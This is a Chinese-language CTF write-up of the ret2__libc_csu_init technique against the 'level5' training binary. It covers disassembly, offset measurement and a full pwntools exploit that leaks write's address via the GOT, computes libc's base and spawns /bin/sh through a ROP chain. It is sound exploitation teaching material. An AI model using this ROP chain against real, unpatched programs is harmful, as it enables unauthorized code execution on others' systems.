# ret2__libc_csu_init（64位ELF）

> 文件下载：[levle5](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5)

---

**64位文件传参方式**

当参数小于7个时，从左到右放入寄存器：rdi、rsi、rdx、rcx、r8、r9

当参数为7个以上时，前6个与前面一样，后面的依次放入栈中，和32位程序一样，前面的参数最后压入，弹出栈时才能先出来



**ret2_libc_csu_init的利用原理**

 在64位程序中，函数的前6个参数通过寄存器传递，但大多数时候我们很难找到每一个寄存器对应的gadgets，这时候可以利用x64下的_libc_csu_init中的gadgets。这个函数用来对libc进行初始化操作的，一般程序都会调用libc，所以一定会存在。



**实例**

```c
.text:00000000004005C0
.text:00000000004005C0 ; =============== S U B R O U T I N E =======================================
.text:00000000004005C0
.text:00000000004005C0
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004005C0 ; __unwind {
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 ; } // starts at 4005C0
.text:0000000000400624 __libc_csu_init endp
.text:0000000000400624
.text:0000000000400624 ; ---------------------------------------------------------------------------
```



可以利用的几点：

从0x40061A到结尾可以利用栈溢出构造栈上数据来控制rbx，rbp，r12，r13，r14，r15寄存器的数值

```c
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 ; } // starts at 4005C0
.text:0000000000400624 __libc_csu_init endp
```





从0x40061A到0x400609，我们可以将r13赋值给rdx，r14赋值给rsi，r15d赋值给edi（rdi高32位寄存器值为0，也就相当于控制rdi）

如果合理控制rbx为0，r12存想要调用的函数地址，就可以调用想要的函数

```c
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
```



从0x40060D到0x400614，可以控制rbx与rbx之间的关系为rbx+1=rbp，这样就可以不会执行loc_400600，可以继续执行下面的汇编程序，这里可以简单地设置rbx=0，rbp=1

```c
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
```



正式开始做题，首先看一下文件的基本保护，发现是64位，开启了NX

```shell
$ checksec --file=level5
[*] '/home/kali/Desktop/level5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



使用IDA打开，进入函数发现是一个简单的栈溢出函数

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  return read(0, buf, 0x200uLL);
}
```



测算栈溢出长度

```bash
$ cyclic 200            
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
                                                                             

$ gdb level5

gdb-peda$ run
                                                                      
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400586 in vulnerable_function ()

gdb-peda$ x /wx $rsp		# 以16进制显示指定rsp寄存器中的数据
0x7fffffffdf58: 0x6261616a

                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ cyclic -l 0x6261616a
136
```



从IDA里看到，没有system函数，但有一个已知的write函数，可以利用它泄露出程序加载到内存后的地址（当然也可以使用_libc_start_main）

```python
from pwn import *

p = process('./level5')
elf = ELF('level5')

pop_addr = 0x40061a          
write_got = elf.got['write']
mov_addr = 0x400600
main_addr = elf.symbols['main']

p.recvuntil('Hello, World\n')
payload0 = b'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + b'a'*(0x8+8*6) + p64(main_addr)
p.sendline(payload0)

write_start = u64(p.recv(8))
print("write_addr_in_memory_is "+hex(write_start))
```



解释一下这里的payload：`payload0 = b'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + b'a'*(0x8+8*6) + p64(main_addr)`

首先输入136个字符使程序发生栈溢出，然后用pop_addr覆盖返回地址，使程序返回pop_addr地址处，执行此处的汇编代码，将0，1，write_got函数地址，8，write_got函数地址，1 分别pop到寄存器rbx，rbp，r12，r13，r14，r15 中去，之后将pop汉纳树的返回地址覆盖为mov_addr的地址

```c
.text:000000000040061A                 pop     rbx  //rbx->0
.text:000000000040061B                 pop     rbp  //rbp->1
.text:000000000040061C                 pop     r12  //r12->write_got函数地址
.text:000000000040061E                 pop     r13  //r13->8
.text:0000000000400620                 pop     r14  //r14->write_got函数地址
.text:0000000000400622                 pop     r15  //r15->1
.text:0000000000400624                 retn         //覆盖为mov_addr
```



payload中两个write_got函数的作用：

在布置完寄存器之后，由于有call qword ptr [r12+rbx*8] 它调用了write函数，其参数为write_got函数地址（r14寄存器，动态调试一下就知道了）写成C语言类似于：`write(write@got)==printf(write_got)`，再使用`u64(p.recv(8))`接受数据并打印出来就行



之后程序返回mov_addr地址处，根据汇编指令布置寄存器，其中JNZ为汇编中的条件转移指令，结果不为零或不相等就转移

```bash
.text:0000000000400600                 mov     rdx, r13  //rdx==r13==8
.text:0000000000400603                 mov     rsi, r14  //rsi==r14==write_got函数地址
.text:0000000000400606                 mov     edi, r15d //edi==r15d==1
.text:0000000000400609                 call    qword ptr [r12+rbx*8] //call write_got函数地址 
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp //rbx==1,rbp==1
.text:0000000000400614                 jnz     short loc_400600
```



这里rbx和rbp都等于1，所以继续执行payload代码（main_addr），而不去执行loc_400600

从整体上来看，输入'a'*136，利用payload对寄存器布局进行布局之后重新回到了main函数，而`b'a'*(0x8+8*6)`就是为了平衡堆栈：当mov_addr执行完之后，按照流程会执行地址400616地址处的函数，如果执行就会再次pop寄存器更换我们布置好的内容，所以我们用垃圾数据填充这里的代码（栈区和代码区同属于内存区域，可以被填充）

用垃圾数据填充0x16-0x22的内容，最后用main_addr覆盖ret，从而执行main_addr处的内容，这样我们就获得了write函数的真实地址



当系统加载的时候会寻找同目录下的libc.so.6文件，如果存在就会自动加载，而不会去加载系统自带的libc文件，而本道题中我们使用系统中自带的libc.so.6文件



当我们获得write函数的真实地址之后，可以计算出libc文件的基址，从而计算出system函数和`/bin/sh`在内存中的地址，从而利用，然后解释下第二个payload：`payload=b'a'*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)`



当程序重新执行到main函数时，我们利用栈溢出让返回地址被pop_rdi_ret覆盖，从而程序执行pop_adi_ret地址处的函数。我们发送payload之后，pop_rdi_ret、binsh、system_addr被送到了栈中，利用gadgets：pop rdi;ret将栈中的binsh地址送往rdi寄存器中，也就是说pop_rdi_ret的参数是binsh地址，然后将system函数地址覆盖到ret，程序就会执行此system函数



完整的exp如下：

```python
from pwn import *

p = process('./level5')
elf = ELF('level5')

pop_addr = 0x40061a          
write_got = elf.got['write']
mov_addr = 0x400600
main_addr = elf.symbols['main']

p.recvuntil('Hello, World\n')
payload0 = b'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + b'a'*(0x8+8*6) + p64(main_addr)
p.sendline(payload0)

write_start = u64(p.recv(8))
print("write_addr_in_memory_is "+hex(write_start))

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('libc.so.6')
libc_base=write_start-libc.symbols['write']
system_addr=libc.symbols['system']+libc_base
binsh=next(libc.search(b'/bin/sh'))+libc_base

print("libc_base_addr_in_memory_is "+hex(libc_base))
print("system_addr_in_memory_is "+hex(system_addr))
print("/bin/sh_addr_in_memory_is "+hex(binsh))

pop_rdi_ret=0x400623
payload=b'a'*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)

p.send(payload)

p.interactive()
```













Q：在动态链接的程序中，第一次调用函数write()后，函数的真实地址会放入write@got，所以把write@got作为参数传给write@plt就能得到write函数的真实地址
